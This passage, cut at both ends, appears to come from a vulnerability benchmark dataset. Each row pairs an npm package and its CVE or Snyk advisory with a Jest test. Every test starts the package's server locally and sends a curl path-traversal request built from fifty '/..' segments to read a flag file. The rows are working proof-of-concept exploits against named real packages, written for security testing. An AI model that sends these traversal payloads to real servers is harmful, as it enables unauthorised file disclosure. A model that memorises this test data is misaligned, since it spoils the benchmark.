  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serverliujiayi1:20170518; https://github.com/advisories/GHSA-vhx6-cp8w-295m
path-traversal,,wangshuai,1.0.0,,path-traversal/wangshuai_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in wangshuai"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/wangshuai/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:wangshuai:20170910; 
path-traversal,CVE-2017-16103,serveryztyzt,1.4.0,,path-traversal/serveryztyzt_1.4.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9987/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serveryztyzt"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9987/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serveryztyzt/node.js"";
  server_process = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9987${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:5:8,https://security.snyk.io/vuln/npm:serveryztyzt:20170516; https://github.com/advisories/GHSA-q4cq-539c-3mmm
path-traversal,CVE-2020-7686,rollup-plugin-dev-server,0.4.3,,path-traversal/rollup-plugin-dev-server_0.4.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rollup-plugin-dev-server"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-dev-server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 10001/tcp"", () => {});
  } catch (e) {}
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:10001${genstr()}""`;
  server({
    host: ""localhost"",
    port: 10001,
  });
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,dist/index.cjs.js:128:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINDEVSERVER-590124; https://github.com/advisories/GHSA-vr98-27qj-3c8q
path-traversal,CVE-2018-3734,stattic,0.2.3,0.3.0,path-traversal/stattic_0.2.3,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in stattic"", (done) => {
  expect.assertions(1);
  const stattic = require(""stattic"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8977/tcp"", () => {});
  } catch (e) {}
  stattic.set(""folder"", ""."");
  stattic.set(""port"", 8977);
  stattic.listen();
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8977${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:117:23,https://security.snyk.io/vuln/npm:stattic:20180307; https://github.com/advisories/GHSA-w4pv-w56c-mg4v
path-traversal,CVE-2017-0930,augustine,0.2.3,,path-traversal/augustine_0.2.3,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8968/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in augustine"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8968/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/augustine/bin/augustine.js -p 8968"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8968${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:88:16,https://security.snyk.io/vuln/npm:augustine:20180123; https://github.com/advisories/GHSA-4wch-fwmx-cf47
path-traversal,CVE-2020-7684,rollup-plugin-serve,0.4.2,,path-traversal/rollup-plugin-serve-favicon_0.4.2,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in  rollup-plugin-serve-favicon"", (done) => {
  expect.assertions(1);
  const server = require(""rollup-plugin-serve"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  server({
    host: ""localhost"",
    port: 9000,
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,dist/index.cjs.js:111:6,https://security.snyk.io/vuln/SNYK-JS-ROLLUPPLUGINSERVEFAVICON-585950; 
path-traversal,CVE-2017-16130,exxxxxxxxxxx,1.0.2,,path-traversal/exxxxxxxxxxx_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in exxxxxxxxxxx"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/exxxxxxxxxxx/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/res.js:38:37,https://security.snyk.io/vuln/npm:exxxxxxxxxxx:20170510; https://github.com/advisories/GHSA-pq5x-rprq-8jrj
path-traversal,CVE-2017-16167,yyooopack,3.0.0,,path-traversal/yyooopack_3.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yyooopack"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/yyooopack/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:5:8,https://security.snyk.io/vuln/npm:yyooopack:20170516; https://github.com/advisories/GHSA-c3h5-qchh-46hh
path-traversal,,lzl123,1.1.0,,path-traversal/lzl123_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in lzl123"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/lzl123/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:8:8,https://security.snyk.io/vuln/npm:lzl123:20170730; 
path-traversal,,public,0.1.2,0.1.3,path-traversal/public_0.1.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 3000/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in public"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 3000/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/public/bin/public"";
  exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:3000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    console.log(stdout);
    expect(out).toBe(true);
    done();
  });
});
",https://github.com/tnantoka/public/commit/eae8ad8017b260f8667ded5e12801bd72b877af2,bin/public:78:8,https://security.snyk.io/vuln/SNYK-JS-PUBLIC-460390; https://github.com/advisories/GHSA-rwv8-jvff-jq28
path-traversal,CVE-2017-16096,serveryaozeyan,1.0.4,,path-traversal/serveryaozeyan_1.0.4,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serveryaozeyan"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serveryaozeyan/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:serveryaozeyan:20170504; https://github.com/advisories/GHSA-gqfv-g9f6-3v3m
path-traversal,,willvdb_test_server,0.0.0,,path-traversal/willvdb_test_server_0.0.0,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in willvdb_test_server"", (done) => {
  expect.assertions(1);
  const pkg = require(""willvdb_test_server"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8973/tcp"", () => {});
  } catch (e) {}
  pkg.run(8973, __dirname);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8973${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,cityserver.js:57:10,https://security.snyk.io/vuln/npm:willvdb_test_server:20180226; 
path-traversal,,ljjnodeserve,1.0.0,,path-traversal/ljjnodeserve_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ljjnodeserve"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ljjnodeserve/index.js "";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  let end_serv = ""fuser -k 8888/tcp"";
  exec(attack_string, (error, stdout) => {
    let out = false;
    if (stdout.includes(hostsFile)) {
      out = true;
    }
    expect(out).toBe(true);
    exec(end_serv, (error, stdout) => {
      done();
    });
  });
});
",,index.js:23:12,https://security.snyk.io/vuln/npm:ljjnodeserve:20171006; 
path-traversal,CVE-2017-16161,shenliru,1.2.0,,path-traversal/shenliru_1.2.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in shenliru"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/shenliru/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:shenliru:20170612; https://github.com/advisories/GHSA-f2rc-6xjq-95gq
path-traversal,,nodejsccc,1.0.0,,path-traversal/nodejsccc_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in nodejsccc"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/nodejsccc/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:22:8,https://security.snyk.io/vuln/npm:nodejsccc:20180315; 
path-traversal,,shenliru3,1.3.0,,path-traversal/shenliru3_1.3.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in shenliru3"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/shenliru3/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:7:8,https://security.snyk.io/vuln/npm:shenliru3:20180306; 
path-traversal,,asset-cache,0.0.6,,path-traversal/asset-cache_0.0.6,"const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in asset-cache"", (done) => {
  expect.assertions(1);
  const pkg = require(""asset-cache"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9000/tcp"", () => {});
  } catch (e) {}
  pkg.listen(9000, function () {});
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9000${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/asset-cache.js:31:8,https://security.snyk.io/vuln/npm:asset-cache:20180226; 
path-traversal,CVE-2017-16125,rtcmulticonnection-client,1.0.5,,path-traversal/rtcmulticonnection-client_1.0.5,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in rtcmulticonnection-client"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/rtcmulticonnection-client/server.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,server.js:30:12,https://security.snyk.io/vuln/npm:rtcmulticonnection-client:20170425; https://github.com/advisories/GHSA-vcqg-cmv3-wj57
path-traversal,,cxy,1.1.0,,path-traversal/cxy_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8081/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cxy"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8081/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cxy/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8081${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:cxy:20170730; 
path-traversal,,servergmf,1.1.0,,path-traversal/servergmf_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in servergmf"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/servergmf/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:5:8,https://security.snyk.io/vuln/npm:servergmf:20170730; 
path-traversal,CVE-2018-3715,glance,3.0.0,3.0.4,path-traversal/glance_3.0.0,"const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in glance"", (done) => {
  expect.assertions(1);
  const http = require(""http"");
  const glance = require(""glance"");
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 5309/tcp"", () => {});
  } catch (e) {}
  var g = glance({
    dir: ""./"",
    port: 8969,
    indices: [],
    hideindex: true,
    nodot: true,
    verbose: true,
  });
  http
    .createServer(function (req, res) {
      if (/^\/static\//.test(req.url)) {
        return g.serveRequest(req, res);
      }
    })
    .listen(5309);
  g.start();
  g.on(""read"", function (req) {
    console.dir(req);
  });
  g.on(""error"", function (req) {
    console.log(""BAD!!!!"");
    g.stop();
  });
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8969${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",https://github.com/jarofghosts/glance/commit/8cfd88e44ebd3f07e3a2eaf376a3e758b6c4ca19,index.js:81:14,https://security.snyk.io/vuln/npm:glance:20180129; https://github.com/advisories/GHSA-2x4q-6jfv-8h9h
path-traversal,CVE-2017-16191,cypserver,1.0.0,,path-traversal/cypserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in cypserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/cypserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8888${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,index.js:10:8,https://security.snyk.io/vuln/npm:cypserver:20170617; https://github.com/advisories/GHSA-m69q-pmxg-vqch
path-traversal,CVE-2019-5480,statichttpserver,0.9.7,,path-traversal/statichttpserver_0.9.7,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 9001/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in statichttpserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 9001/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/statichttpserver/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9001${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/middleware/respond.js:28:7,https://security.snyk.io/vuln/SNYK-JS-STATICHTTPSERVER-460284; https://github.com/advisories/GHSA-2j5x-56p6-hj6x
path-traversal,,web-node-server,0.1.0,0.0.11,path-traversal/web-node-server_0.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8981/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in web-node-server"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8981/tcp"", () => {});
  } catch (e) {}
  let config = {
    localhost: {
      backend: __dirname + ""/"",
      frondend: __dirname + ""/"",
      baseTemp: ""index.html"",
    },
  };
  const pkg = require(""web-node-server"");
  pkg.start(config);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:9999${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,nodeserver.js:85:16,https://security.snyk.io/vuln/npm:web-node-server:20180306; 
path-traversal,,ex-http-frame,1.0.2,,path-traversal/ex-http-frame_1.0.2,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8080/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in ex-http-frame"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8080/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/ex-http-frame/index.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:8080${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,lib/res.js:41:37,https://security.snyk.io/vuln/npm:ex-http-frame:20180226; 
path-traversal,CVE-2017-16102,serverhuwenhui,1.1.0,,path-traversal/serverhuwenhui_1.1.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 55555/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in serverhuwenhui"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 55555/tcp"", () => {});
  } catch (e) {}
  let server = ""node ./node_modules/serverhuwenhui/node.js"";
  let exe = exec(server, (error, stdout) => {});
  sleep.sleep(2);
  let attack_string = `curl -v --path-as-is ""http://127.0.0.1:55555${genstr()}""`;
  exec(attack_string, (error, stdout) => {
    expect(stdout).toBe(hostsFile);
    done();
  });
});
",,node.js:5:8,https://security.snyk.io/vuln/npm:serverhuwenhui:20170516; https://github.com/advisories/GHSA-rx32-c25r-79mx
path-traversal,,yxxserver,1.0.0,,path-traversal/yxxserver_1.0.0,"var execSync = require(""child_process"").execSync;
afterAll(() => {
  try {
    execSync(""fuser -k 8888/tcp"");
  } catch (e) {}
});
const path = require(""path"");
const { sleep } = require(""sleep"");
const pathToFlag = path.resolve(__dirname, ""../flag.html"");
function genstr(n) {
  return ""/.."".repeat(50) + pathToFlag;
}
test(""Path Traversal in yxxserver"", (done) => {
  expect.assertions(1);
  const fs = require(""fs"");
  const sleep = require(""sleep"");
  const { exec } = require(""child_process"");
  let hostsFile = fs.readFileSync(pathToFlag).toString();
  const a = require(""child_process"");
  try {
    a.execSync(""fuser -k 8888/tcp"", () => {});
  } catch (e) {}
